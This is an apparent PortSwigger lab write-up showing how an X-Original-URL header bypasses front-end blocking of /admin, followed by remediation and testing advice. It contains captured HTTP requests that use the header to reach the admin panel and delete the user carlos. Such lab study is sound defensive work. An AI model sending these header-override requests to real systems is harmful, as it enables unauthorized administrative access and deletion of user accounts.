# URL-Based Access Control Can Be Circumvented  

**Category**: 01-Broken-Access-Control  
**Lab_ID**: URL-Access-Bypass-001  
**Source**: PortSwigger  
**Date_Completed**: 2025-10-12  
**Tag**: `Broken-Access-Control`, `Admin-Panel`, `X-Original-URL`, `Front-End-Routing`, `Access-Control-Bypass`  

---

## Executive summary

The application enforces access control at a front-end proxy or reverse proxy layer using URL path checks. Direct access to `/admin` is blocked with a plain response, indicating front-end filtering. However, the back-end system trusts and processes a custom HTTP header `X-Original-URL`, overriding the actual request path. By sending requests to the root path (`/`) while setting `X-Original-URL: /admin`, an authenticated user can bypass front-end restrictions and access the admin panel. This was exploited to delete the `carlos` user account via `/admin/delete?username=carlos`. The vulnerability demonstrates improper trust in client-controlled headers and inadequate layered access control.

**Result:** Bypassed front-end URL blocking using `X-Original-URL` header → accessed `/admin` → deleted user `carlos`.  
**Severity (subjective):** High — allows unauthorized access to administrative functionality.  
**Recommended immediate action:** Remove or sanitize `X-Original-URL` header processing; enforce access control at the back-end.

---

## Objective

Bypass URL-based access control to access the admin panel and delete the user `carlos`.

---

## Environment & tools

* Target: PortSwigger lab instance (Apprentice difficulty).  
* Tools: Burp Suite (Repeater, Proxy), modern browser.  
* Notes: Requires authentication (session cookie provided); no admin credentials needed.

---

## Discovery  

1. Attempted to access `/admin` directly and received a plain blocked response, suggesting front-end filtering (e.g., reverse proxy, CDN, or load balancer).  
2. Sent the request to **Burp Repeater** and changed the request line to `GET /` while adding `X-Original-URL: /invalid`.  
3. Observed a "not found" response, confirming the back-end processes the `X-Original-URL` header as the intended path.  
4. Changed `X-Original-URL: /admin` → successfully accessed the admin panel.  
5. To delete `carlos`, sent `GET /?username=carlos` with `X-Original-URL: /admin/delete`.

> Finding: The back-end blindly trusts the `X-Original-URL` header, allowing attackers to bypass front-end URL-based access controls.

---

## Reproduction steps  

1. Log in to the application (session cookie: `Zx9JQfWO8nmNVWQ7bZDZYGMUSqVetwir`).  
2. Use **Burp Repeater** to craft a request to `GET /`.  
3. Add header: `X-Original-URL: /admin`.  
4. Send request → admin panel loads.  
5. Craft deletion request:  
   - Request line: `GET /?username=carlos`  
   - Header: `X-Original-URL: /admin/delete`  
6. Send request → user `carlos` deleted.  
7. Verify via lab completion.

**Captured Burp Suite HTTP interactions:**

**Request 1: Access admin panel via header override**
```
GET / HTTP/2
Host: 0a48004904c1276882430cc400dc00f9.web-security-academy.net
Cookie: session=Zx9JQfWO8nmNVWQ7bZDZYGMUSqVetwir
Sec-Ch-Ua: "Not=A?Brand";v="24", "Chromium";v="140"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: en-US,en;q=0.9
X-Original-URL: /admin
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a48004904c1276882430cc400dc00f9.web-security-academy.net/login
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
```

**Request 2: Delete user carlos via header override**
```
GET /?username=carlos HTTP/2
Host: 0a48004904c1276882430cc400dc00f9.web-security-academy.net
Cookie: session=Zx9JQfWO8nmNVWQ7bZDZYGMUSqVetwir
Sec-Ch-Ua: "Not=A?Brand";v="24", "Chromium";v="140"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: en-US,en;q=0.9
X-Original-Url: /admin/delete
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a48004904c1276882430cc400dc00f9.web-security-academy.net/admin
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
```

---

## Observed impact

* Authenticated user bypasses front-end access controls to reach admin functionality.  
* Successful deletion of `carlos` account.  
* Potential for: mass user deletion, privilege escalation, data exfiltration, or configuration changes.  
* Undermines the entire access control model if front-end filtering is the only barrier.

---

## Root cause analysis

* **Primary cause:** Back-end application trusts and processes the `X-Original-URL` header to determine the target endpoint, bypassing front-end routing and access control.  
* **Secondary cause / contributing factor:** Lack of validation or normalization of custom headers; no server-side authorization checks on admin paths.

---

## Risk assessment

* **Likelihood:** High — any authenticated user can send custom headers using tools like Burp or browser extensions.  
* **Impact:** High — full access to admin panel enables destructive actions.  
* **Overall risk:** High.  
  Optionally map to CVSS: Likely **High** (e.g., CVSS base score ~7.5–8.5) due to authenticated bypass of access control.

---

## Remediation  

### Immediate / short-term  

1. **Remove or ignore** the `X-Original-URL` header in the back-end application.  
2. Block or strip the header at the front-end proxy (e.g., Nginx, Apache, CDN).  
3. Return `403` for any request containing `X-Original-URL` with sensitive paths.

### Medium-term  

1. **Enforce server-side access control**: Validate user role/permissions on every admin endpoint, regardless of routing method.  
2. **Use standard routing**: Rely on the actual request path, not custom headers.  
3. **Header validation**: Whitelist only expected headers; reject unknown or suspicious ones (e.g., `X-*`).  
4. **CSRF protection**: Add tokens to state-changing admin actions.

### Long-term / defensive controls

1. Implement centralized authorization middleware that checks roles before routing.  
2. Add logging and alerting for use of `X-Original-URL` or other override headers.  
3. Use WAF rules to block requests with `X-Original-URL` targeting `/admin*`.  
4. Conduct architecture review: Ensure access control is enforced at the application layer, not just the edge.  
5. Add automated tests to detect header-based routing bypasses.

---

## Detection & verification guidance  

* Test admin endpoints with `X-Original-URL` set to sensitive paths — must return `403` or ignore the header.  
* Verify back-end uses only the request URI for routing and authorization.  
* Scan code for usage of `X-Original-URL`, `X-Rewrite-URL`, or similar headers.  
* Use Burp Repeater to simulate header manipulation during testing.  
* Add CI test: Send `X-Original-URL: /admin` → assert access denied.

---

## Suggested tests to add

* Integration test: Request with `X-Original-URL: /admin` returns `403` or `404`, not admin panel.  
* Security test: Non-admin user cannot access `/admin/delete` via header override.  
* Header validation test: Application rejects or ignores unknown `X-*` headers.  
* Logging test: Use of `X-Original-URL` logs as a security event.  
* Fuzz test: Inject common override headers and check for bypass.

---

## References & further reading

* OWASP Top Ten — Broken Access Control  
* OWASP Header Security Cheat Sheet  
* PortSwigger: Bypassing Access Controls via Header Manipulation  
* General guidance: Never trust client-controlled headers for routing or authorization.

---

## Notes & lessons learned

* **Front-end filtering is not enough** — access control must be enforced at the back-end.  
* Custom headers like `X-Original-URL` are often used in misconfigured reverse proxies or microservices — treat them as untrusted input.  
* Plain error responses (vs. full HTML) are a clue that a front-end system is blocking access.  
* **Burp Repeater is ideal** for testing header-based bypasses.

---

## Evidence & validation  

* Direct `GET /admin` → blocked (plain response).  
* `GET /` + `X-Original-URL: /admin` → admin panel loaded.  
* `GET /?username=carlos` + `X-Original-URL: /admin/delete` → user deleted.  
* Lab completed successfully.

---

> **Legal & ethical reminder:** This writeup documents testing performed in a controlled PortSwigger lab environment. Do not apply these techniques to real systems without explicit authorization.
